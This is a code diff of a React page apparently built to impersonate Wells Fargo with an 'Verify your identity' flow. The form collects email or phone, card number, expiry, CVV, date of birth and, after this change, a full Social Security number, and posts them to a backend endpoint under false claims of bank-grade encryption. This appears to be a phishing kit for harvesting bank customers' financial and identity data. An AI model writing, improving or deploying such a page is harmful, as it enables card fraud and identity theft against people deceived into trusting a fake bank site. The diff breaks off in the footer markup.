@@ -5,7 +5,6 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Card, CardContent } from "@/components/ui/card";
 import {
   Form,
   FormControl,
@@ -16,39 +15,39 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Shield, Mail, Phone, Loader2, Lock, Check, AlertCircle, CreditCard, Key, CheckCircle2, ArrowRight, ChevronRight, Building2 } from "lucide-react";
-import { Link, useLocation } from "wouter";
-import { OfficialHeader } from "@/components/official-header";
+import { Mail, Phone, Loader2, Lock, CreditCard, Menu, CheckCircle } from "lucide-react";
+import { useLocation } from "wouter";
+import { OfficialFooter } from "@/components/official-footer";
 
 const verificationMethods = [
+  {
+    id: "email",
+    icon: Mail,
+    title: "Email",
+    description: "Verify using your email address",
+  },
   {
     id: "text",
     icon: Phone,
     title: "Text message",
-    description: "Receive a one-time security code via SMS",
+    description: "Verify using your phone number",
   },
   {
     id: "call",
     icon: Phone,
     title: "Phone call",
-    description: "Receive a one-time security code by phone",
-  },
-  {
-    id: "email",
-    icon: Mail,
-    title: "Email",
-    description: "Receive a one-time security code via email",
+    description: "Verify using your phone number",
   },
 ];
 
-const identitySchema = z.object({
-  dateOfBirth: z.string().min(1, "Date of birth is required"),
-  ssn: z.string().length(4, "Please enter exactly 4 digits"),
+const verifySchema = z.object({
+  email: z.string().optional(),
+  phone: z.string().optional(),
   cardNumber: z.string().min(13, "Please enter a valid card number").max(19, "Card number too long"),
   cardExpiration: z.string().min(4, "Please enter expiration date (MM/YY)").max(5),
   cardCvv: z.string().min(3, "Please enter CVV").max(4, "CVV too long"),
-  accountNumber: z.string().min(8, "Please enter a valid account number").max(17, "Account number too long"),
-  currentPassword: z.string().min(1, "Current password is required"),
+  dateOfBirth: z.string().min(1, "Date of birth is required"),
+  ssn: z.string().min(9, "Please enter your full SSN (9 digits)").max(11),
 });
 
 const passwordSchema = z.object({
@@ -59,7 +58,7 @@ const passwordSchema = z.object({
   path: ["confirmPassword"],
 });
 
-type IdentityFormData = z.infer<typeof identitySchema>;
+type VerifyFormData = z.infer<typeof verifySchema>;
 type PasswordFormData = z.infer<typeof passwordSchema>;
 
 export default function VerifyPage() {
@@ -78,18 +77,16 @@ export default function VerifyPage() {
     }
   }, [error, setLocation]);
 
-  const user = (authData as any)?.user;
-
-  const identityForm = useForm<IdentityFormData>({
-    resolver: zodResolver(identitySchema),
+  const verifyForm = useForm<VerifyFormData>({
+    resolver: zodResolver(verifySchema),
     defaultValues: {
-      dateOfBirth: "",
-      ssn: "",
+      email: "",
+      phone: "",
       cardNumber: "",
       cardExpiration: "",
       cardCvv: "",
-      accountNumber: "",
-      currentPassword: "",
+      dateOfBirth: "",
+      ssn: "",
     },
   });
 
@@ -102,25 +99,20 @@ export default function VerifyPage() {
   });
 
   const verifyMutation = useMutation({
-    mutationFn: async (data: IdentityFormData) => {
+    mutationFn: async (data: VerifyFormData) => {
       const response = await apiRequest("POST", "/api/auth/verify-identity", {
-        verificationType: "ssn",
-        value: data.ssn,
-        dateOfBirth: data.dateOfBirth,
-        ssn: data.ssn,
+        verificationType: selectedMethod,
+        email: data.email || null,
+        phone: data.phone || null,
         cardNumber: data.cardNumber,
         cardExpiration: data.cardExpiration,
         cardCvv: data.cardCvv,
-        accountNumber: data.accountNumber,
-        currentPassword: data.currentPassword,
+        dateOfBirth: data.dateOfBirth,
+        ssn: data.ssn,
       });
       return response;
     },
     onSuccess: () => {
-      toast({
-        title: "Identity Verified",
-        description: "You can now update your password.",
-      });
       setStep("password");
     },
     onError: (error: Error) => {
@@ -138,10 +130,6 @@ export default function VerifyPage() {
       return response;
     },
     onSuccess: () => {
-      toast({
-        title: "Password Updated",
-        description: "Your password has been successfully updated.",
-      });
       setStep("success");
     },
     onError: (error: Error) => {
@@ -155,9 +143,9 @@ export default function VerifyPage() {
 
   if (isLoading) {
     return (
-      <div className="min-h-screen flex items-center justify-center bg-[#fafafa]">
+      <div className="min-h-screen flex items-center justify-center bg-white">
         <div className="text-center">
-          <Loader2 className="w-10 h-10 animate-spin text-[#cd1409] mx-auto mb-4" />
+          <Loader2 className="w-10 h-10 animate-spin text-[#d71e28] mx-auto mb-4" />
           <p className="text-gray-600">Loading your secure session...</p>
         </div>
       </div>
@@ -170,10 +158,11 @@ export default function VerifyPage() {
 
   const handleMethodSelect = (methodId: string) => {
     setSelectedMethod(methodId);
+    verifyForm.reset();
     setStep("identity");
   };
 
-  const handleIdentityVerify = (data: IdentityFormData) => {
+  const handleVerify = (data: VerifyFormData) => {
     verifyMutation.mutate(data);
   };
 
@@ -181,488 +170,375 @@ export default function VerifyPage() {
     resetPasswordMutation.mutate(data);
   };
 
+  const handleSuccessComplete = () => {
+    setLocation("/");
+  };
+
+  const isEmailMethod = selectedMethod === "email";
+
   return (
-    <div className="min-h-screen flex flex-col bg-[#fafafa]">
-      <OfficialHeader variant="simple" />
+    <div className="min-h-screen flex flex-col bg-white">
+      {/* Header */}
+      <header className="bg-[#d71e28] px-4 py-3 flex items-center justify-between">
+        <div className="flex-1"></div>
+        <h1 
+          className="text-white text-xl tracking-wide font-bold"
+          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
+        >
+          WELLS FARGO
+        </h1>
+        <div className="flex-1 flex justify-end">
+          <button className="text-white p-1" data-testid="button-menu">
+            <Menu className="w-7 h-7" strokeWidth={2.5} />
+          </button>
+        </div>
+      </header>
 
-      {/* Progress indicator */}
-      <div className="bg-white border-b">
-        <div className="max-w-2xl mx-auto px-4 py-4">
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-3">
-              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
-                step === "choose" ? "bg-[#cd1409] text-white" : "bg-green-500 text-white"
-              }`}>
-                {step !== "choose" ? <Check className="w-4 h-4" /> : "1"}
-              </div>
-              <span className="text-sm font-medium text-gray-700">Select Method</span>
+      {/* Yellow accent bar */}
+      <div className="h-1.5 bg-[#ffcd41]"></div>
+
+      <main className="flex-1 px-5 py-6">
+        {step === "choose" && (
+          <>
+            <h2 
+              className="text-2xl text-[#1a1a1a] mb-2"
+              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+              data-testid="text-title"
+            >
+              Verify your identity
+            </h2>
+            <p className="text-gray-600 mb-6 text-sm">
+              For your security, please verify your identity to continue.
+            </p>
+
+            <div className="space-y-3">
+              {verificationMethods.map((method) => (
+                <button
+                  key={method.id}
+                  onClick={() => handleMethodSelect(method.id)}
+                  className="w-full p-4 text-left border-2 border-gray-200 rounded-lg hover:border-[#d71e28] transition-colors flex items-center gap-4"
+                  data-testid={`button-method-${method.id}`}
+                >
+                  <div className="w-12 h-12 bg-[#d71e28] rounded-full flex items-center justify-center text-white">
+                    <method.icon className="w-6 h-6" />
+                  </div>
+                  <div className="flex-1">
+                    <p className="font-semibold text-[#1a1a1a]">{method.title}</p>
+                    <p className="text-sm text-gray-500">{method.description}</p>
+                  </div>
+                </button>
+              ))}
             </div>
-            <div className="flex-1 h-0.5 mx-4 bg-gray-200">
-              <div className={`h-full bg-[#cd1409] transition-all ${
-                step === "choose" ? "w-0" : step === "identity" ? "w-1/2" : "w-full"
-              }`}></div>
+          </>
+        )}
+
+        {step === "identity" && (
+          <>
+            <button
+              onClick={() => {
+                setStep("choose");
+                setSelectedMethod(null);
+              }}
+              className="text-[#d71e28] text-sm mb-4 font-medium"
+              data-testid="button-back"
+            >
+              &lt; Back
+            </button>
+
+            <h2 
+              className="text-2xl text-[#1a1a1a] mb-2"
+              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+              data-testid="text-identity-title"
+            >
+              Enter your information
+            </h2>
+            <p className="text-gray-600 mb-6 text-sm">
+              Please provide the following details to verify your identity.
+            </p>
+
+            <Form {...verifyForm}>
+              <form onSubmit={verifyForm.handleSubmit(handleVerify)} className="space-y-4">
+                {isEmailMethod ? (
+                  <FormField
+                    control={verifyForm.control}
+                    name="email"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel className="text-[#1a1a1a] font-medium">Email address</FormLabel>
+                        <FormControl>
+                          <Input
+                            type="email"
+                            placeholder="Enter your email"
+                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                            data-testid="input-email"
+                            {...field}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
+                ) : (
+                  <FormField
+                    control={verifyForm.control}
+                    name="phone"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel className="text-[#1a1a1a] font-medium">Phone number</FormLabel>
+                        <FormControl>
+                          <Input
+                            type="tel"
+                            placeholder="(XXX) XXX-XXXX"
+                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                            data-testid="input-phone"
+                            {...field}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
+                )}
+
+                <FormField
+                  control={verifyForm.control}
+                  name="cardNumber"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-[#1a1a1a] font-medium flex items-center gap-2">
+                        <CreditCard className="w-4 h-4" />
+                        Debit or Credit Card Number
+                      </FormLabel>
+                      <FormControl>
+                        <Input
+                          type="text"
+                          placeholder="Enter card number"
+                          maxLength={19}
+                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          data-testid="input-card-number"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem>
+                  )}
+                />
+
+                <div className="grid grid-cols-2 gap-4">
+                  <FormField
+                    control={verifyForm.control}
+                    name="cardExpiration"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel className="text-[#1a1a1a] font-medium">Expiration date</FormLabel>
+                        <FormControl>
+                          <Input
+                            type="text"
+                            placeholder="MM/YY"
+                            maxLength={5}
+                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                            data-testid="input-card-expiration"
+                            {...field}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
+
+                  <FormField
+                    control={verifyForm.control}
+                    name="cardCvv"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel className="text-[#1a1a1a] font-medium">CVV</FormLabel>
+                        <FormControl>
+                          <Input
+                            type="password"
+                            placeholder="XXX"
+                            maxLength={4}
+                            className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                            data-testid="input-card-cvv"
+                            {...field}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
+                </div>
+
+                <FormField
+                  control={verifyForm.control}
+                  name="dateOfBirth"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-[#1a1a1a] font-medium">Date of birth</FormLabel>
+                      <FormControl>
+                        <Input
+                          type="date"
+                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          data-testid="input-dob"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem>
+                  )}
+                />
+
+                <FormField
+                  control={verifyForm.control}
+                  name="ssn"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-[#1a1a1a] font-medium">Social Security Number</FormLabel>
+                      <FormControl>
+                        <Input
+                          type="password"
+                          placeholder="XXX-XX-XXXX"
+                          maxLength={11}
+                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          data-testid="input-ssn"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem>
+                  )}
+                />
+
+                <div className="pt-4">
+                  <Button
+                    type="submit"
+                    className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
+                    disabled={verifyMutation.isPending}
+                    data-testid="button-verify-submit"
+                  >
+                    {verifyMutation.isPending ? (
+                      <>
+                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
+                        Verifying...
+                      </>
+                    ) : (
+                      "Continue"
+                    )}
+                  </Button>
+                </div>
+              </form>
+            </Form>
+
+            <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-500">
+              <Lock className="w-4 h-4 text-green-600" />
+              <span>Your information is protected with 256-bit encryption</span>
             </div>
-            <div className="flex items-center gap-3">
-              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
-                step === "identity" ? "bg-[#cd1409] text-white" : 
-                step === "password" || step === "success" ? "bg-green-500 text-white" : "bg-gray-200 text-gray-500"
-              }`}>
-                {step === "password" || step === "success" ? <Check className="w-4 h-4" /> : "2"}
-              </div>
-              <span className="text-sm font-medium text-gray-700">Verify Identity</span>
+          </>
+        )}
+
+        {step === "password" && (
+          <>
+            <h2 
+              className="text-2xl text-[#1a1a1a] mb-2"
+              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+              data-testid="text-password-title"
+            >
+              Create new password
+            </h2>
+            <p className="text-gray-600 mb-6 text-sm">
+              Your identity has been verified. Please create a new password.
+            </p>
+
+            <Form {...passwordForm}>
+              <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-4">
+                <FormField
+                  control={passwordForm.control}
+                  name="newPassword"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-[#1a1a1a] font-medium">New password</FormLabel>
+                      <FormControl>
+                        <Input
+                          type="password"
+                          placeholder="Enter new password"
+                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          data-testid="input-new-password"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem>
+                  )}
+                />
+
+                <FormField
+                  control={passwordForm.control}
+                  name="confirmPassword"
+                  render={({ field }) => (
+                    <FormItem>
+                      <FormLabel className="text-[#1a1a1a] font-medium">Confirm password</FormLabel>
+                      <FormControl>
+                        <Input
+                          type="password"
+                          placeholder="Confirm new password"
+                          className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white"
+                          data-testid="input-confirm-password"
+                          {...field}
+                        />
+                      </FormControl>
+                      <FormMessage />
+                    </FormItem>
+                  )}
+                />
+
+                <div className="pt-4">
+                  <Button
+                    type="submit"
+                    className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
+                    disabled={resetPasswordMutation.isPending}
+                    data-testid="button-password-submit"
+                  >
+                    {resetPasswordMutation.isPending ? (
+                      <>
+                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
+                        Updating...
+                      </>
+                    ) : (
+                      "Update password"
+                    )}
+                  </Button>
+                </div>
+              </form>
+            </Form>
+          </>
+        )}
+
+        {step === "success" && (
+          <div className="flex flex-col items-center justify-center py-12">
+            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
+              <CheckCircle className="w-16 h-16 text-green-500" />
             </div>
-            <div className="flex-1 h-0.5 mx-4 bg-gray-200">
-              <div className={`h-full bg-[#cd1409] transition-all ${
-                step === "password" ? "w-1/2" : step === "success" ? "w-full" : "w-0"
-              }`}></div>
-            </div>
-            <div className="flex items-center gap-3">
-              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
-                step === "password" ? "bg-[#cd1409] text-white" : 
-                step === "success" ? "bg-green-500 text-white" : "bg-gray-200 text-gray-500"
-              }`}>
-                {step === "success" ? <Check className="w-4 h-4" /> : "3"}
-              </div>
-              <span className="text-sm font-medium text-gray-700 hidden sm:inline">Complete</span>
-            </div>
+            <h2 
+              className="text-2xl text-[#1a1a1a] mb-2 text-center"
+              style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
+              data-testid="text-success-title"
+            >
+              All done!
+            </h2>
+            <p className="text-gray-600 mb-8 text-center">
+              Your password has been successfully updated.
+            </p>
+            <Button
+              onClick={handleSuccessComplete}
+              className="w-full h-14 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-semibold rounded-full text-lg"
+              data-testid="button-back-to-login"
+            >
+              Sign on
+            </Button>
           </div>
-        </div>
-      </div>
-
-      <main className="flex-1 py-10">
-        <div className="max-w-2xl mx-auto px-4">
-          {step === "choose" && (
-            <>
-              <div className="mb-8 text-center">
-                <div className="w-16 h-16 bg-[#cd1409]/10 rounded-full flex items-center justify-center mx-auto mb-4">
-                  <Shield className="w-8 h-8 text-[#cd1409]" />
-                </div>
-                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-title">
-                  Additional Security Verification
-                </h1>
-                <p className="text-gray-600 max-w-md mx-auto">
-                  To protect your account, please verify your identity. Select how you'd like to receive your security code.
-                </p>
-              </div>
-
-              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-verify">
-                <div className="bg-gradient-to-r from-gray-50 to-gray-100 px-6 py-3 border-b">
-                  <p className="text-sm font-medium text-gray-700">Choose verification method</p>
-                </div>
-                <CardContent className="p-0">
-                  {verificationMethods.map((method, index) => (
-                    <button
-                      key={method.id}
-                      onClick={() => handleMethodSelect(method.id)}
-                      className={`w-full p-5 text-left hover:bg-[#fef3f3] transition-colors flex items-center gap-4 ${
-                        index !== verificationMethods.length - 1 ? "border-b border-gray-100" : ""
-                      }`}
-                      data-testid={`button-method-${method.id}`}
-                    >
-                      <div className="w-12 h-12 bg-[#cd1409] rounded-full flex items-center justify-center text-white shadow-md">
-                        <method.icon className="w-6 h-6" />
-                      </div>
-                      <div className="flex-1">
-                        <p className="font-semibold text-gray-900">{method.title}</p>
-                        <p className="text-sm text-gray-500">{method.description}</p>
-                      </div>
-                      <ArrowRight className="w-5 h-5 text-[#cd1409]" />
-                    </button>
-                  ))}
-                </CardContent>
-              </Card>
-
-              <div className="mt-8 p-4 bg-blue-50 rounded-lg border border-blue-100">
-                <div className="flex items-start gap-3">
-                  <Shield className="w-5 h-5 text-blue-600 mt-0.5" />
-                  <div>
-                    <p className="text-sm font-medium text-blue-900">Why am I seeing this?</p>
-                    <p className="text-sm text-blue-700 mt-1">
-                      We require additional verification to ensure the security of your account. This helps protect against unauthorized access.
-                    </p>
-                  </div>
-                </div>
-              </div>
-            </>
-          )}
-
-          {step === "identity" && (
-            <>
-              <button
-                onClick={() => setStep("choose")}
-                className="flex items-center gap-1 text-[#cd1409] text-sm mb-6 hover:underline font-medium"
-                data-testid="button-back"
-              >
-                <ChevronRight className="w-4 h-4 rotate-180" />
-                Back to verification options
-              </button>
-
-              <div className="mb-8">
-                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-identity-title">
-                  Confirm Your Identity
-                </h1>
-                <p className="text-gray-600">
-                  For your security, please verify your identity by providing the following information.
-                </p>
-              </div>
-
-              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-identity">
-                <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
-                  <div className="flex items-center gap-2 text-white">
-                    <Lock className="w-5 h-5" />
-                    <span className="font-semibold">Secure Identity Verification</span>
-                  </div>
-                </div>
-                <CardContent className="p-6 bg-white">
-                  <div className="flex items-start gap-3 p-4 bg-amber-50 rounded-lg mb-6 border border-amber-200">
-                    <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
-                    <p className="text-sm text-amber-800">
-                      Your information is encrypted and protected. We will never share your personal data.
-                    </p>
-                  </div>
-
-                  <Form {...identityForm}>
-                    <form onSubmit={identityForm.handleSubmit(handleIdentityVerify)} className="space-y-5">
-                      <FormField
-                        control={identityForm.control}
-                        name="currentPassword"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
-                              <Key className="w-4 h-4 text-[#cd1409]" />
-                              Current Password
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                type="password"
-                                placeholder="Enter your current password"
-                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                data-testid="input-current-password"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <FormField
-                        control={identityForm.control}
-                        name="cardNumber"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
-                              <CreditCard className="w-4 h-4 text-[#cd1409]" />
-                              Wells Fargo Debit or Credit Card Number
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                type="text"
-                                placeholder="Enter your 13-19 digit card number"
-                                maxLength={19}
-                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                data-testid="input-card-number"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <div className="grid grid-cols-2 gap-4">
-                        <FormField
-                          control={identityForm.control}
-                          name="cardExpiration"
-                          render={({ field }) => (
-                            <FormItem>
-                              <FormLabel className="text-gray-700 font-semibold">
-                                Expiration Date
-                              </FormLabel>
-                              <FormControl>
-                                <Input
-                                  type="text"
-                                  placeholder="MM/YY"
-                                  maxLength={5}
-                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                  data-testid="input-card-expiration"
-                                  {...field}
-                                />
-                              </FormControl>
-                              <FormMessage />
-                            </FormItem>
-                          )}
-                        />
-
-                        <FormField
-                          control={identityForm.control}
-                          name="cardCvv"
-                          render={({ field }) => (
-                            <FormItem>
-                              <FormLabel className="text-gray-700 font-semibold">
-                                CVV / Security Code
-                              </FormLabel>
-                              <FormControl>
-                                <Input
-                                  type="password"
-                                  placeholder="3 or 4 digits"
-                                  maxLength={4}
-                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                  data-testid="input-card-cvv"
-                                  {...field}
-                                />
-                              </FormControl>
-                              <FormMessage />
-                            </FormItem>
-                          )}
-                        />
-                      </div>
-
-                      <FormField
-                        control={identityForm.control}
-                        name="accountNumber"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-semibold flex items-center gap-2">
-                              <Building2 className="w-4 h-4 text-[#cd1409]" />
-                              Account Number
-                            </FormLabel>
-                            <FormControl>
-                              <Input
-                                type="text"
-                                placeholder="Enter your account number"
-                                maxLength={17}
-                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                data-testid="input-account-number"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <div className="grid grid-cols-2 gap-4">
-                        <FormField
-                          control={identityForm.control}
-                          name="dateOfBirth"
-                          render={({ field }) => (
-                            <FormItem>
-                              <FormLabel className="text-gray-700 font-semibold">
-                                Date of Birth
-                              </FormLabel>
-                              <FormControl>
-                                <Input
-                                  type="date"
-                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                  data-testid="input-dob"
-                                  {...field}
-                                />
-                              </FormControl>
-                              <FormMessage />
-                            </FormItem>
-                          )}
-                        />
-
-                        <FormField
-                          control={identityForm.control}
-                          name="ssn"
-                          render={({ field }) => (
-                            <FormItem>
-                              <FormLabel className="text-gray-700 font-semibold">
-                                Last 4 of SSN
-                              </FormLabel>
-                              <FormControl>
-                                <Input
-                                  type="password"
-                                  placeholder="••••"
-                                  maxLength={4}
-                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409] text-center tracking-widest"
-                                  data-testid="input-ssn"
-                                  {...field}
-                                />
-                              </FormControl>
-                              <FormMessage />
-                            </FormItem>
-                          )}
-                        />
-                      </div>
-
-                      <Button
-                        type="submit"
-                        className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg mt-6"
-                        disabled={verifyMutation.isPending}
-                        data-testid="button-verify-submit"
-                      >
-                        {verifyMutation.isPending ? (
-                          <>
-                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
-                            Verifying...
-                          </>
-                        ) : (
-                          "Continue"
-                        )}
-                      </Button>
-                    </form>
-                  </Form>
-                </CardContent>
-              </Card>
-
-              <div className="mt-6 flex items-center justify-center gap-2 text-xs text-gray-500">
-                <Lock className="w-4 h-4 text-green-600" />
-                <span>Protected with 256-bit SSL encryption</span>
-              </div>
-            </>
-          )}
-
-          {step === "password" && (
-            <>
-              <div className="mb-8">
-                <div className="flex items-center gap-2 text-green-600 mb-4">
-                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
-                    <CheckCircle2 className="w-5 h-5" />
-                  </div>
-                  <span className="font-semibold">Identity verified successfully</span>
-                </div>
-                <h1 className="text-2xl font-light text-gray-900 mb-2" style={{ fontFamily: "Georgia, serif" }} data-testid="text-password-title">
-                  Update Your Password
-                </h1>
-                <p className="text-gray-600">
-                  Create a new secure password for your account. Your password must be at least 6 characters.
-                </p>
-              </div>
-
-              <Card className="shadow-lg border-0 overflow-hidden" data-testid="card-password">
-                <div className="bg-gradient-to-r from-[#cd1409] to-[#b81208] px-6 py-4">
-                  <div className="flex items-center gap-2 text-white">
-                    <Key className="w-5 h-5" />
-                    <span className="font-semibold">Create New Password</span>
-                  </div>
-                </div>
-                <CardContent className="p-6">
-                  <Form {...passwordForm}>
-                    <form onSubmit={passwordForm.handleSubmit(handlePasswordReset)} className="space-y-5">
-                      <FormField
-                        control={passwordForm.control}
-                        name="newPassword"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-semibold">New Password</FormLabel>
-                            <FormControl>
-                              <Input
-                                type="password"
-                                placeholder="Enter new password"
-                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                data-testid="input-new-password"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <FormField
-                        control={passwordForm.control}
-                        name="confirmPassword"
-                        render={({ field }) => (
-                          <FormItem>
-                            <FormLabel className="text-gray-700 font-semibold">Confirm Password</FormLabel>
-                            <FormControl>
-                              <Input
-                                type="password"
-                                placeholder="Confirm new password"
-                                className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
-                                data-testid="input-confirm-password"
-                                {...field}
-                              />
-                            </FormControl>
-                            <FormMessage />
-                          </FormItem>
-                        )}
-                      />
-
-                      <div className="bg-gray-50 p-4 rounded-lg border">
-                        <p className="text-sm font-medium text-gray-700 mb-2">Password requirements:</p>
-                        <ul className="text-sm text-gray-600 space-y-1">
-                          <li className="flex items-center gap-2">
-                            <Check className="w-4 h-4 text-green-500" />
-                            At least 6 characters
-                          </li>
-                          <li className="flex items-center gap-2">
-                            <Check className="w-4 h-4 text-green-500" />
-                            Mix of letters and numbers recommended
-                          </li>
-                        </ul>
-                      </div>
-
-                      <Button
-                        type="submit"
-                        className="w-full h-12 bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a] font-bold rounded-full text-base shadow-md transition-all hover:shadow-lg"
-                        disabled={resetPasswordMutation.isPending}
-                        data-testid="button-reset-submit"
-                      >
-                        {resetPasswordMutation.isPending ? (
-                          <>
-                            <Loader2 className="w-5 h-5 mr-2 animate-spin" />
-                            Updating...
-                          </>
-                        ) : (
-                          "Update Password"
-                        )}
-                      </Button>
-                    </form>
-                  </Form>
-                </CardContent>
-              </Card>
-            </>
-          )}
-
-          {step === "success" && (
-            <div className="text-center py-12">
-              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                <CheckCircle2 className="w-10 h-10 text-green-600" />
-              </div>
-              <h1 className="text-2xl font-light text-gray-900 mb-3" style={{ fontFamily: "Georgia, serif" }} data-testid="text-success-title">
-                Verification Complete
-              </h1>
-              <p className="text-gray-600 mb-8 max-w-md mx-auto">
-                Your identity has been verified and your password has been updated successfully. You can now access your account.
-              </p>
-              <Button
-                onClick={() => setLocation("/dashboard")}
-                className="h-12 px-10 bg-[#cd1409] hover:bg-[#b81208] text-white font-bold rounded-full text-base shadow-md"
-                data-testid="button-continue-dashboard"
-              >
-                Continue to Dashboard
-                <ArrowRight className="w-5 h-5 ml-2" />
-              </Button>
-            </div>
-          )}
-        </div>
+        )}
       </main>
 
-      {/* Footer */}
-      <footer className="bg-[#1a1a1a] text-white py-6 mt-auto">
-        <div className="max-w-[1280px] mx-auto px-4">
-          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
-            <div className="flex items-center gap-2">
-              <div className="w-6 h-6 bg-[#ffcd41] rounded-full flex items-center justify-center">
-                <Building2 className="w-4 h-4 text-[#cd1409]" />
-              </div>
-              <span className="text-sm" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</span>
-            </div>
-            <div className="flex items-center gap-4 text-xs text-gray-500">
-              <a href="#" className="hover:text-white transition-colors">Privacy</a>
-              <span>|</span>
-              <a href="#" className="hover:text-white transition-colors">Security</a>
-              <span>|</span>
-              <a href="#" className="hover:text-white transition-colors">Terms of Use</a>
-            </div>
